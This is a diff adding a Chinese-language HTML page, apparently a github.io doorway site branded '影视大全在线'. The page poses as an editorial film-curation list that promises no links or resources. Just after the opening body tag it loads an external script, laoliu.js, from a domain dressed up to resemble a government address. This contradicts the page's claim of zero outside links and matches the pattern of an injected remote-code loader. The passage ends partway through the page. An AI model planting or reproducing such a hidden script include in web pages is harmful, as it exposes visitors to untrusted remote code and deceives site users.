@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, viewport-fit=cover" />
+<title>影视大全在线 - 不贪全的观影清单·每天只留7条 | yingshidaquanzaixian-h5.github.io</title>
+<meta name="description" content="影视大全在线（yingshidaquanzaixian-h5.github.io）不贪全的观影清单：每天只留7条，多一条就删。编辑部的减法策展、被划掉的条目、补回来的一句。纯文字，不播片、不存片、不链片、不做资源聚合。" />
+<meta name="keywords" content="影视大全在线,yingshidaquanzaixian-h5,不贪全,观影清单,减法策展,编辑部,每天七条,片单" />
+<meta name="author" content="影视大全在线 · 编辑部" />
+<meta name="robots" content="index,follow" />
+<link rel="canonical" href="https://yingshidaquanzaixian-h5.github.io/" />
+<style>
+/* ============ 影视大全在线 · 编辑部的删减稿 ============
+   反"大全"结构：以 <del> 与 <ins> 为视觉语言
+   DOM 差异：稿纸流 + 划掉态 + 手账式批注，无卡片网格、无帧带、无四象限
+   配色：铅笔灰 / 牛皮纸 / 审稿红 / 打字机黑
+*/
+:root{
+  --paper:#F1EAD9;--vellum:#FBF6E9;--black:#23201C;--lead:#5A5448;
+  --grey:#9A9182;--red:#C0392B;--redsoft:rgba(192,57,43,.12);--ink:#1C1A17;
+  --line:rgba(35,32,28,.18);--maxw:1080px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--paper);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  line-height:1.85;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+}
+.serif{font-family:"Noto Serif SC","Songti SC","STSong",Georgia,serif}
+.pencil{font-family:"Courier New",ui-monospace,Menlo,monospace}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 18px}
+
+/* ---- 稿纸顶边：铅笔划痕 ---- */
+.edge{height:14px;background:
+  repeating-linear-gradient(90deg,var(--paper) 0 26px,rgba(35,32,28,.22) 26px 27px) 0 0/27px 14px repeat-x,
+  var(--black)}
+.edge::after{content:"";position:absolute;left:0;right:0;height:14px;
+  background:linear-gradient(90deg,transparent 12%,rgba(192,57,43,.35) 12% 13%,transparent 13% 41%,rgba(192,57,43,.22) 41% 42.5%,transparent 42.5%);pointer-events:none}
+
+/* ---- 顶栏 ---- */
+header.bar{position:sticky;top:0;z-index:60;background:rgba(241,234,217,.96);backdrop-filter:blur(12px);border-bottom:2px solid var(--black)}
+.bar-in{max-width:var(--maxw);margin:0 auto;padding:0 18px;height:60px;display:flex;align-items:center;gap:12px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:900;letter-spacing:1px;font-size:17px}
+.brand .mark{
+  width:34px;height:34px;flex:none;background:var(--vellum);border:1.5px solid var(--black);position:relative;
+  transform:rotate(-2deg);display:flex;align-items:center;justify-content:center;
+}
+.brand .mark::before{content:"";position:absolute;left:4px;right:4px;top:50%;height:2px;background:var(--red);transform:rotate(-3deg)}
+.brand .mark i{font-style:normal;font-family:"Courier New",monospace;font-weight:900;font-size:12px;color:var(--black);position:relative;z-index:1;background:var(--vellum);padding:0 2px}
+.brand small{display:block;font-family:"Courier New",monospace;font-size:8px;color:var(--grey);letter-spacing:1px;font-weight:600}
+.nav{margin-left:auto;display:flex;gap:2px;align-items:center}
+.nav a{padding:7px 11px;font-size:12.5px;font-weight:700;color:var(--ink);letter-spacing:.3px}
+.nav a:hover{background:var(--red);color:#fff}
+.nav a.here{background:var(--black);color:var(--paper)}
+.nav .slash{color:var(--grey);font-size:11px;margin:0 2px}
+.search{display:flex;border:1.5px solid var(--line);background:var(--vellum)}
+.search input{border:0;outline:0;padding:7px 11px;width:130px;font-size:12.5px;background:transparent;color:var(--ink)}
+.search input::placeholder{color:var(--grey);font-style:italic}
+.search button{border:0;border-left:1.5px solid var(--line);background:var(--black);color:var(--paper);padding:0 11px;font-weight:800;cursor:pointer;font-size:11px;font-family:"Courier New",monospace}
+.burger{display:none;margin-left:auto;border:1.5px solid var(--black);background:var(--vellum);padding:5px 10px;font-size:15px;color:var(--ink);cursor:pointer}
+
+/* ---- Hero：被划掉的"大全" ---- */
+.hero{position:relative;padding:60px 0 44px;border-bottom:2px solid var(--black);background:
+  radial-gradient(900px 340px at 88% 6%,rgba(192,57,43,.08),transparent),
+  var(--paper)}
+.hero::before{content:"";position:absolute;inset:0;background:
+  linear-gradient(transparent 31px,rgba(35,32,28,.05) 31px 32px) 0 0/100% 32px;pointer-events:none}
+.hero .wrap{position:relative}
+.edit{font-family:"Courier New",monospace;font-size:11px;letter-spacing:3px;color:var(--red);font-weight:800;margin-bottom:16px;display:flex;gap:10px;align-items:center}
+.edit::before{content:"§";background:var(--red);color:#fff;padding:1px 5px;font-size:9px}
+.hero h1{
+  font-size:clamp(34px,6.4vw,62px);line-height:1.12;margin:0;font-weight:950;letter-spacing:-.5px;
+}
+/* 核心动效：全 字被红笔划掉 */
+.hero h1 .cross{
+  position:relative;display:inline-block;white-space:nowrap;
+}
+.hero h1 .cross::after{
+  content:"";position:absolute;left:-3%;right:-3%;top:52%;height:5px;background:var(--red);
+  transform:rotate(-4deg);transform-origin:center;
+  animation:strike 1.5s cubic-bezier(.4,0,.2,1) forwards;transform:scaleX(0);
+}
+@keyframes strike{60%{transform:rotate(-4deg) scaleX(1.04)}100%{transform:rotate(-4deg) scaleX(1)}}
+.hero h1 .keep{color:var(--red)}
+.hero .sub{font-family:"Courier New",monospace;font-size:12px;letter-spacing:3px;color:var(--grey);margin-top:14px;display:block}
+.hero p.lede{margin:20px 0 0;color:var(--lead);font-size:15.5px;max-width:34em;position:relative}
+.hero p.lede b{color:var(--ink);background:var(--redsoft);padding:0 3px;border-bottom:2px solid var(--red)}
+.hero p.lede del{color:var(--grey);text-decoration-color:var(--red);text-decoration-thickness:2px}
+.hero p.lede ins{color:var(--red);text-decoration:none;font-weight:800;border-bottom:2px solid var(--red)}
+
+.counter{display:flex;gap:0;margin-top:26px;flex-wrap:wrap;position:relative}
+.counter div{border:1.5px solid var(--black);border-right:0;padding:11px 16px;background:var(--vellum);flex:1;min-width:120px}
+.counter div:last-child{border-right:1.5px solid var(--black)}
+.counter b{display:block;font-family:"Courier New",monospace;font-size:22px;font-weight:900;letter-spacing:1px;color:var(--red)}
+.counter b small{font-size:11px;color:var(--grey);font-weight:600;margin-left:3px}
+.counter span{font-size:10.5px;color:var(--lead);letter-spacing:.5px}
+.cta{display:flex;gap:8px;margin-top:24px;flex-wrap:wrap;position:relative}
+.cta a{font-size:13px;font-weight:800;padding:10px 22px;border:1.5px solid var(--black)}
+.cta a.pri{background:var(--black);color:var(--paper)}
+.cta a.sec{background:var(--vellum);color:var(--ink)}
+.cta a:hover{background:var(--red);border-color:var(--red);color:#fff}
+
+/* ---- 栏目通用 ---- */
+section{padding:50px 0;border-bottom:1.5px solid var(--line);position:relative}
+section::before{content:"";position:absolute;left:0;right:0;top:0;height:100%;pointer-events:none;
+  background:linear-gradient(transparent 31px,rgba(35,32,28,.035) 31px 32px) 0 0/100% 32px;opacity:.55}
+.sec-head{display:flex;gap:14px;align-items:flex-end;flex-wrap:wrap;margin-bottom:26px;padding-bottom:10px;border-bottom:3px double var(--black);position:relative}
+.sec-head .no{font-family:"Courier New",monospace;font-size:12px;font-weight:900;color:var(--red);letter-spacing:2px;line-height:1}
+.sec-head h2{margin:0;font-size:23px;font-weight:950;letter-spacing:.5px;flex:1;min-width:200px}
+.sec-head h2 small{display:block;font-family:"Courier New",monospace;font-size:10px;color:var(--grey);letter-spacing:2px;font-weight:600;margin-top:4px}
+.sec-head .more{font-family:"Courier New",monospace;font-size:11px;color:var(--red);font-weight:800;letter-spacing:1px;white-space:nowrap}
+
+/* ---- 栏目一：稿纸流（核心 DOM，以 del/ins 为语法） ---- */
+.sheet{background:var(--vellum);border:1.5px solid var(--black);padding:8px 0 4px;position:relative}
+.sheet::before{content:"今日留稿 · NO.0001　／　超标条目已物理删除";position:absolute;top:-10px;left:18px;background:var(--paper);
+  font-family:"Courier New",monospace;font-size:9.5px;font-weight:800;color:var(--red);letter-spacing:1.5px;padding:0 8px}
+.entry{display:grid;grid-template-columns:76px 1fr;gap:0;border-bottom:1px dashed var(--line);padding:16px 20px;position:relative}
+.entry:last-child{border-bottom:0}
+.entry .num{font-family:"Courier New",monospace;font-size:11px;font-weight:900;color:var(--grey);letter-spacing:1px;padding-top:3px}
+.entry .num i{display:block;font-style:normal;font-size:20px;color:var(--black);line-height:1}
+.entry h3{margin:0 0 6px;font-size:17px;font-weight:900;letter-spacing:.3px;line-height:1.4}
+/* 划掉的假条目：被编辑枪毙 */
+.entry.del h3{color:var(--grey);text-decoration:line-through;text-decoration-color:var(--red);text-decoration-thickness:2px}
+.entry.del .why{color:var(--grey);font-size:12.5px;font-style:italic}
+.entry .body p{margin:0 0 7px;font-size:13.5px;color:var(--lead);line-height:1.75}
+.entry .body p .yes{color:var(--red);font-weight:800;background:var(--redsoft);padding:0 3px}
+.entry .body p .no{color:var(--grey);text-decoration:line-through;text-decoration-color:var(--red)}
+.entry .meta{font-family:"Courier New",monospace;font-size:9.5px;color:var(--grey);letter-spacing:.8px;border-top:1px solid var(--line);padding-top:7px;margin-top:4px;display:flex;gap:14px;flex-wrap:wrap}
+.entry .meta b{color:var(--black)}
+.entry .meta .kill{color:var(--red);font-weight:800}
+.entry .note{margin-top:8px;font-family:"Courier New",monospace;font-size:11.5px;color:var(--red);background:#fff;
+  border-left:3px solid var(--red);padding:7px 11px;line-height:1.6}
+.entry .note::before{content:"批注 › ";font-weight:900}
+
+/* ---- 栏目二：被删掉的"大全承诺"（对开反驳，第二种 DOM） ---- */
+.debate{display:grid;grid-template-columns:1fr 1fr;gap:0;border:2px solid var(--black);background:var(--black)}
+.debate>div{padding:26px 24px;background:var(--vellum)}
+.debate .lie{background:#f6e3e0}
+.debate .truth{border-left:2px solid var(--black)}
+.debate h4{margin:0 0 4px;font-family:"Courier New",monospace;font-size:10px;letter-spacing:3px;font-weight:900;color:var(--grey)}
+.debate .lie h4{color:var(--red)}
+.debate h3{margin:0 0 12px;font-size:21px;font-weight:950;line-height:1.3}
+.debate h3 del{color:var(--red);text-decoration-thickness:3px}
+.debate p{margin:0 0 8px;font-size:13.5px;color:var(--lead);line-height:1.8}
+.debate p:last-child{margin:0}
+.debate .fix{font-weight:800;color:var(--red);background:var(--redsoft);padding:0 3px}
+
+/* ---- 栏目三：七条清单（有序 + 可勾选，第三种 DOM） ---- */
+.seven{list-style:none;margin:0;padding:0;counter-reset:seven;background:var(--vellum);border:1.5px solid var(--black)}
+.seven li{counter-increment:seven;display:grid;grid-template-columns:52px 1fr auto;gap:14px;align-items:flex-start;padding:15px 20px;border-bottom:1px solid var(--line);cursor:default;transition:.15s}
+.seven li:last-child{border-bottom:0}
+.seven li:hover{background:#f7f0de}
+.seven li::before{content:counter(seven,decimal-leading-zero);font-family:"Courier New",monospace;font-weight:900;font-size:15px;color:var(--red);padding-top:2px}
+.seven li b{font-size:15px;font-weight:900;display:block;line-height:1.4}
+.seven li p{margin:3px 0 0;font-size:12.5px;color:var(--lead);line-height:1.65}
+.seven li .box{width:20px;height:20px;border:1.5px solid var(--black);flex:none;margin-top:3px;position:relative;background:#fff}
+.seven li.done .box::after{content:"×";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--red);font-weight:900;font-size:16px;line-height:1}
+.seven li.done b,.seven li.done p{color:var(--grey);text-decoration:line-through;text-decoration-color:var(--red)}
+.seven li.done{background:rgba(192,57,43,.05)}
+
+/* ---- 栏目四：编辑手账（网格便签，第四种 DOM） ---- */
+.notes{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
+.n{background:var(--vellum);border:1.5px solid var(--black);padding:16px 16px 14px;position:relative;transform:rotate(var(--r,0deg));transition:.2s;min-height:140px}
+.n:nth-child(odd){--r:-1.2deg}.n:nth-child(even){--r:1.4deg}.n:nth-child(3n){--r:-.8deg}
+.n:hover{transform:rotate(0) translateY(-4px);box-shadow:6px 8px 0 rgba(35,32,28,.10)}
+.n .pin{position:absolute;top:-7px;left:16px;width:13px;height:13px;border-radius:50%;background:var(--red);box-shadow:inset -2px -2px 0 rgba(0,0,0,.18);border:1.5px solid var(--black)}
+.n .t{font-family:"Courier New",monospace;font-size:9px;font-weight:900;color:var(--grey);letter-spacing:1.5px;margin-bottom:6px}
+.n h4{margin:0 0 5px;font-size:14.5px;font-weight:900;line-height:1.4}
+.n p{margin:0;font-size:12px;color:var(--lead);line-height:1.65;font-style:italic}
+.n .who{font-family:"Courier New",monospace;font-size:9px;color:var(--red);margin-top:9px;border-top:1px dashed var(--line);padding-top:5px;font-style:normal;letter-spacing:.5px}
+
+/* ---- 栏目五：FAQ（details，第五种） ---- */
+.faq details{border:1.5px solid var(--line);background:var(--vellum);margin-bottom:9px}
+.faq details[open]{border-color:var(--black);box-shadow:6px 6px 0 rgba(35,32,28,.08)}
+.faq summary{cursor:pointer;padding:14px 18px;font-weight:900;font-size:14.5px;list-style:none;display:flex;gap:12px;align-items:center}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:"[ ]";font-family:"Courier New",monospace;color:var(--red);font-size:13px;font-weight:900}
+.faq details[open] summary::before{content:"[×]"}
+.faq summary .k{margin-left:auto;font-family:"Courier New",monospace;font-size:9.5px;color:var(--grey);font-weight:800;letter-spacing:1px}
+.faq .body{padding:0 18px 16px 44px;color:var(--lead);font-size:13px;line-height:1.85;border-top:1px dashed var(--line);padding-top:12px}
+.faq .body code{font-family:"Courier New",monospace;font-size:11px;background:#e9e0cb;border:1px solid var(--line);padding:1px 6px;color:var(--red)}
+.faq .body b{color:var(--ink)}
+.warn{border-color:var(--red);background:#f6e3e0}
+.warn summary{color:var(--red)}
+
+/* ---- 关于 ---- */
+.about{display:grid;grid-template-columns:1.25fr .75fr;gap:24px;align-items:start}
+.txt{background:var(--vellum);border:1.5px solid var(--line);padding:26px}
+.txt h3{margin:0 0 12px;font-size:19px;font-weight:950}
+.txt h3::before{content:"§ ";color:var(--red);font-family:"Courier New",monospace}
+.txt p{margin:0 0 12px;color:var(--lead);font-size:14px}
+.txt p:last-child{margin:0}
+.rulebook{border:2px solid var(--black);background:var(--ink);color:var(--paper);padding:22px}
+.rulebook h4{margin:0 0 14px;font-family:"Courier New",monospace;font-size:11px;letter-spacing:3px;color:var(--red);font-weight:800}
+.rulebook ol{margin:0;padding:0;list-style:none;counter-reset:r}
+.rulebook ol li{counter-increment:r;padding:9px 0 9px 34px;position:relative;border-bottom:1px solid rgba(255,255,255,.16);font-size:12.5px;line-height:1.6;color:#d8d1c0}
+.rulebook ol li:last-child{border-bottom:0}
+.rulebook ol li::before{content:counter(r,decimal-leading-zero);position:absolute;left:0;top:9px;font-family:"Courier New",monospace;font-weight:900;font-size:12px;color:var(--red)}
+.rulebook ol li b{color:#fff}
+
+footer{background:var(--ink);color:#c4bcae;padding:34px 0 44px}
+footer .wrap{display:grid;grid-template-columns:1.3fr 1fr;gap:24px}
+footer h4{margin:0 0 10px;font-size:16px;color:#fff;letter-spacing:2px;font-weight:950}
+footer h4 span{color:var(--red)}
+footer p{margin:0;font-size:12px;line-height:1.9;color:#a89f90}
+footer .mono{font-family:"Courier New",monospace;font-size:11px;color:var(--red);word-break:break-all;letter-spacing:.5px}
+footer .rule{font-family:"Courier New",monospace;font-size:9.5px;color:#6f6a5e;margin-top:10px;letter-spacing:.5px;line-height:1.7}
+.copy{margin-top:26px;padding-top:16px;border-top:1px solid rgba(255,255,255,.16);font-family:"Courier New",monospace;font-size:10px;color:#6f6a5e;text-align:center;letter-spacing:1px}
+
+/* ---- 响应式 ---- */
+@media(max-width:900px){
+  .debate{grid-template-columns:1fr}
+  .debate .truth{border-left:0;border-top:2px solid var(--black)}
+  .about{grid-template-columns:1fr}
+  footer .wrap{grid-template-columns:1fr}
+  .counter div{min-width:calc(50% - 1px);border-bottom:1.5px solid var(--black)}
+  .counter div:nth-child(odd){border-right:1.5px solid var(--black)}
+  .counter div:nth-child(1),.counter div:nth-child(2){border-bottom:0}
+}
+@media(max-width:720px){
+  .nav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:var(--paper);border-bottom:2px solid var(--black);padding:10px 18px;gap:0}
+  .nav.open{display:flex}
+  .nav a{padding:10px 10px;border-bottom:1px solid var(--line)}
+  .nav .slash{display:none}
+  .burger{display:block}
+  .search{margin-left:auto;margin-right:8px}
+  .search input{width:84px}
+  .hero{padding:38px 0 30px}
+  .entry{grid-template-columns:1fr;gap:6px;padding:14px 16px}
+  .entry .num{font-size:10px;padding-top:0;display:flex;gap:8px;align-items:baseline}
+  .entry .num i{font-size:14px}
+  .seven li{grid-template-columns:38px 1fr 20px;padding:13px 16px;gap:10px}
+  .sec-head{flex-direction:column;align-items:flex-start;gap:5px}
+}
+@media print{
+  .edge,.nav,.search,.burger,.cta{display:none}
+  body{background:#fff}
+  .hero h1 .cross::after{transform:rotate(-4deg) scaleX(1);animation:none}
+  section::before{display:none}
+  .n{transform:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="edge" role="presentation"></div>
+
+<header class="bar">
+  <div class="bar-in">
+    <div class="brand">
+      <div class="mark" aria-hidden="true"><i>影</i></div>
+      <div>影视大全在线<small>EDITORIAL · 不贪全的清单</small></div>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#one" class="here">今日留稿</a><span class="slash">/</span>
+      <a href="#two">划掉什么</a><span class="slash">/</span>
+      <a href="#three">七条</a><span class="slash">/</span>
+      <a href="#four">编辑手账</a><span class="slash">/</span>
+      <a href="#five">立场</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="检索一条被删掉的口味…" aria-label="检索稿纸" />
+      <button type="button" onclick="alert('编辑部检索演示：本页不返回任何资源链接')">查档</button>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main>
+
+  <!-- ============ HERO：划掉"全"字 ============ -->
+  <section class="hero" id="top">
+    <div class="wrap">
+      <div class="edit">EDITORIAL NOTE · 本期主题：把"全"字划掉</div>
+      <h1>影视<span class="cross">大全</span><br/><span class="keep">在线</span>，只留对的</h1>
+      <span class="sub">别人贪 全 ， 我 们 贪 那 一 口 对 的 。</span>
+      <p class="lede">全网都在跟你比<del>谁片更多、谁更新更快、谁免费到底</del>——那套话术我们不用。<br/>
+      这里每天只留 <ins>7 条</ins>：一条情绪、一句理由、<b>多一条就删</b>。被划掉的不是"不好"，是"不值得占你今晚的那一格"。<br/>贪全的人给你一座垃圾山，我们只给你<ins>一口对的</ins>。</p>
+      <div class="counter" aria-label="编辑部账本">
+        <div><b>7<small>/ 日</small></b><span>今日留稿条数</span></div>
+        <div><b>0</b><span>播放源</span></div>
+        <div><b>0</b><span>外链 / 下载</span></div>
+        <div><b>−13</b><span>今天砍掉的候选</span></div>
+      </div>
+      <div class="cta">
+        <a class="pri" href="#one">看今天被留下的 7 条</a>
+        <a class="sec" href="#two">看我们划掉了什么</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目一：今日留稿（del/ins 语法） ============ -->
+  <section id="one" data-role="栏目 · 今日留稿">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">01/SHEET</div>
+        <h2>今日留稿 <small>今天只留下这 7 条 · 其余 13 条已在编辑会物理删除</small></h2>
+        <a class="more" href="#">— 翻往期稿 #</a>
+      </div>
+
+      <div class="sheet">
+
+        <article class="entry del">
+          <div class="num"><i>×</i>候选 01</div>
+          <div class="body">
+            <h3>本周热榜 Top 50 一键追完包</h3>
+            <p class="why">枪毙理由：热榜是别人的胃口，不是你的。把 50 部塞给你，等于一部都没给你。</p>
+            <div class="meta"><span>处置 <b class="kill">整栏删除</b></span><span>替代方案 ↓ 看第 1 条</span></div>
+          </div>
+        </article>
+
+        <article class="entry">
+          <div class="num"><i>01</i>留稿</div>
+          <div class="body">
+            <h3>想被接住的时候，只要一部，别要一堆</h3>
+            <p>今天只推一格：<span class="yes">一个人把饭吃完也不慌</span>。<span class="no">不附片单、不附链接、不告诉你片名</span>——你先在脑子里过一遍"最近哪部让我松了口气"，那就是今晚的，不用我喂。</p>
+            <div class="note">编辑按：真正的片单只有你能写。我们最多帮你把门推开一条缝，别指望我们替你走完。</div>
+            <div class="meta"><span>情绪 <b>接住</b></span><span>剂量 <b>一部，就停</b></span><span>备注 <b>看完别刷下一条</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry del">
+          <div class="num"><i>×</i>候选 02</div>
+          <div class="body">
+            <h3>全网同步更新 · 上线即追</h3>
+            <p class="why">枪毙理由："快"是追剧最没用的指标。赶上的那口，往往不如晚三天带着剧透看的爽。</p>
+            <div class="meta"><span>处置 <b class="kill">删除 + 罚编辑抄三遍"慢"</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry">
+          <div class="num"><i>02</i>留稿</div>
+          <div class="body">
+            <h3>第二格：把"丧"当材料，不当故障</h3>
+            <p>留一部让你<strong>看完更丧、但第二天能起床</strong>的。它不长在治愈区，长在"原来有人把我的烂日子拍得不丢人"。<span class="yes">丧片不是毒药，是体温计</span>。</p>
+            <div class="note">批注：这类片我们永远不给评分。一分都是冒犯。</div>
+            <div class="meta"><span>情绪 <b>丧愈</b></span><span>剂量 <b>一周一次，别续杯</b></span><span>备注 <b>散场别找人聊</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry">
+          <div class="num"><i>03</i>留稿</div>
+          <div class="body">
+            <h3>第三格：一部"什么都没发生"的</h3>
+            <p>没有反转、没有高潮，主角就晒了半天太阳、修了一只灯、走了一段路。<span class="yes">你要练的不是耐性，是重新觉得"没事发生"也值得</span>。</p>
+            <div class="meta"><span>情绪 <b>降噪</b></span><span>剂量 <b>一个懒下午</b></span><span>备注 <b>配真饭，别配手机</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry del">
+          <div class="num"><i>×</i>候选 03</div>
+          <div class="body">
+            <h3>4K · HDR · 全网最高画质无广告</h3>
+            <p class="why">枪毙理由：画质是器材党的自我安慰。手机屏上 4K 和 1080p 的差，不如你关灯不关灯的差大。</p>
+            <div class="meta"><span>处置 <b class="kill">删</b></span><span>补一句 <b>把灯关了</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry">
+          <div class="num"><i>04</i>留稿</div>
+          <div class="body">
+            <h3>第四格：替你翻一次桌的</h3>
+            <p>不是打打杀杀。是某个角色终于说出你憋了三年的那句，然后镜头就停在别人脸上看傻了。<span class="yes">代偿爽一次，不用忏悔</span>，现实里你还得忍，但今晚可以先松一下牙关。</p>
+            <div class="meta"><span>情绪 <b>代偿</b></span><span>剂量 <b>一小杯</b></span><span>备注 <b>爽完别发朋友圈表态</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry">
+          <div class="num"><i>05</i>留稿</div>
+          <div class="body">
+            <h3>第五格：一部你会"重看"的</h3>
+            <p>不是最喜欢，是最熟。熟到台词没意思了，但你还是会在某个雨夜点开，因为<span class="yes">它的空气你认得</span>。重看是给自己留的一间屋。</p>
+            <div class="meta"><span>情绪 <b>定点</b></span><span>剂量 <b>不设上限</b></span><span>备注 <b>别解释为什么爱它</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry">
+          <div class="num"><i>06</i>留稿</div>
+          <div class="body">
+            <h3>第六格：让你学会"停"的那部</h3>
+            <p>它教过你一件事：<strong>可以中途暂停，可以今天不看完，可以连片头都懒得看。</strong>追剧不必 finish，像吃饭不必光盘。</p>
+            <div class="note">批注：这一格是本页唯一的教学格。学会了，剩下六格你也能自己挑。</div>
+            <div class="meta"><span>情绪 <b>许可</b></span><span>剂量 <b>随时</b></span><span>备注 <b>允许烂尾，允许弃</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry del">
+          <div class="num"><i>×</i>候选 07</div>
+          <div class="body">
+            <h3>注册登录解锁全站资源 · VIP 一键畅享</h3>
+            <p class="why">枪毙理由：这行字出现的地方，内容已经死了。我们不收手机号、不开会员、不上传你的口味。</p>
+            <div class="meta"><span>处置 <b class="kill">永久黑名单 · 见编辑部铁律 §6</b></span></div>
+          </div>
+        </article>
+
+        <article class="entry">
+          <div class="num"><i>07</i>留稿</div>
+          <div class="body">
+            <h3>第七格：留白</h3>
+            <p>今天第七格我们<strong>不填</strong>。留给你自己写一行：今晚那一口，你想要什么。<span class="yes">写不出来就空着，空着也是一条有效记录</span>。</p>
+            <div class="note">批注：往期空格率 38%。空着的那些人，后来都自己找到了。</div>
+            <div class="meta"><span>情绪 <b>你自己定</b></span><span>剂量 <b>一格</b></span><span>备注 <b>不许我们替你填</b></span></div>
+          </div>
+        </article>
+
+      </div>
+      <p style="font-size:11px;color:var(--grey);margin:12px 0 0">※ 稿中条目均为<b>策展语法与情绪示例</b>，不指向具体作品、不含片名索引、不附观看入口。红笔划掉的条目＝本页明确拒绝的运营话术。</p>
+    </div>
+  </section>
+
+  <!-- ============ 栏目二：划掉什么（对开反驳） ============ -->
+  <section id="two" data-role="栏目 · 划掉什么">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">02/STRIKE</div>
+        <h2>我们划掉的，正是别人拿来当卖点的 <small>把"大全"这套话术逐条枪毙</small></h2>
+        <a class="more" href="#">— 完整黑名单 #</a>
+      </div>
+
+      <div class="debate">
+        <div class="lie">
+          <h4>// 他们承诺的</h4>
+          <h3>海量 · 全网同步 · <del>免费到底</del> · 4K 无广告</h3>
+          <p>"10 万部任你选""院线下映三天即上线""多线路秒开""一站追完全网"。<del>全、快、免费、高清</del>——四个字凑齐，就是一套完整的流量漏斗。</p>
+          <p>代价藏在字缝里：开屏广告、解析跳站、摇一摇乱转、权限全开、片源来路不明。<b>你以为省了会员，其实交出的是注意力、通讯录和"反正免费的"那份轻慢。</b></p>
+        </div>
+        <div class="truth">
+          <h4>// 我们留下的</h4>
+          <h3>一天七条 · <span class="fix">慢一口</span> · 不存一片</h3>
+          <p>不做"全"，做<strong>准</strong>。不准算法替你选，不准数量压过口味，不准用"免费"换你的数据。<span class="fix">宁可空一格，不拿垃圾填满。</span></p>
+          <p>你在这页得不到播放地址、得不到网盘码、得不到"换源"，只得到一句<strong>"今晚这一口，你可以这样挑"</strong>。挑完了自己走，我们不留你。这才是"大全"该有的反面。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目三：七条清单 ============ -->
+  <section id="three" data-role="栏目 · 今日七条">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">03/007</div>
+        <h2>今日七条 · 勾掉式 <small>看完一条勾一条，勾完就关。别收藏，收藏是明天的负担</small></h2>
+        <a class="more" href="#">— 换一批 #</a>
+      </div>
+
+      <ul class="seven" id="seven">
+        <li class="done"><b>先把"热榜"关掉十分钟</b><p>不找"大家都在看"，先想你此刻缺哪一口。这一条勾掉，才算开始。</p></li>
+        <li><b>找一部让你松口气的</b><p>标准只有一条：想起它，肩膀会掉下来半寸。</p></li>
+        <li><b>再找一部"什么都没发生"的</b><p>能看完一段晒被子、发会儿呆、不觉得浪费，今天就有救了。</p></li>
+        <li><b>给"丧片"留个位子</b><p>看完更丧但能睡着的，是药；看完热血沸腾要出门干架的，是毒。别搞混。</p></li>
+        <li><b>翻一部老熟人</b><p>不用新。熟到能背转场的那种，才是今晚最省力的选择。</p></li>
+        <li><b>练一次中途暂停</b><p>看到一半觉得够了就停。追完是习惯，停下是本事。</p></li>
+        <li><b>第七格空着</b><p>写不出就空。明天来，这格还在。</p></li>
+      </ul>
+      <p style="font-size:11px;color:var(--grey);margin:10px 0 0">※ 清单为互动演示，点击任意一行可勾掉（仅本地视觉，不上传、不留痕）。</p>
+    </div>
+  </section>
+
+  <!-- ============ 栏目四：编辑手账 ============ -->
+  <section id="four" data-role="栏目 · 编辑手账">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">04/MARGIN</div>
+        <h3 style="margin:0;font-size:23px;font-weight:950;flex:1;min-width:200px">编辑手账 <small>稿纸边上的乱写，比正文真</small></h3>
+        <a class="more" href="#">— 更多批注 #</a>
+      </div>
+
+      <div class="notes">
+        <div class="n"><span class="pin"></span><div class="t">MARGIN · 01</div><h4>"全"是个动词，不是形容词</h4><p>一喊大全，就开始囤。囤着囤着，就再也找不到自己当初想看的那一口。</p><div class="who">— 主编 · 稿纸边</div></div>
+        <div class="n"><span class="pin"></span><div class="t">MARGIN · 02</div><h4>别给治愈打分</h4><p>9.2 分的哭片未必比你那部 6.8 的烂片管用。分是给别人的，嘴是自己的。</p><div class="who">— 周二选题会</div></div>
+        <div class="n"><span class="pin"></span><div class="t">MARGIN · 03</div><h4>我们故意没有搜索框</h4><p>有的。但它不吐片名，只吐一句反问。想被喂的人会恨这功能。</p><div class="who">— 产品批注</div></div>
+        <div class="n"><span class="pin"></span><div class="t">MARGIN · 04</div><h4>"免费"两个字最贵</h4><p>付过钱的反而轻省；免费的你得拿注意力、通讯录和失眠来抵。</p><div class="who">— 审稿红线</div></div>
+        <div class="n"><span class="pin"></span><div class="t">MARGIN · 05</div><h4>允许烂尾</h4><p>弃剧不是失败。一部戏撑不起你的周末，你的周末也不该交给一部戏。</p><div class="who">— 读者来信摘</div></div>
+        <div class="n"><span class="pin"></span><div class="t">MARGIN · 06</div><h4>空一格是技术</h4><p>能把第七格留白的人，已经比追完三部长剧的人更会看。</p><div class="who">— 年终复盘</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目五：声明 ============ -->
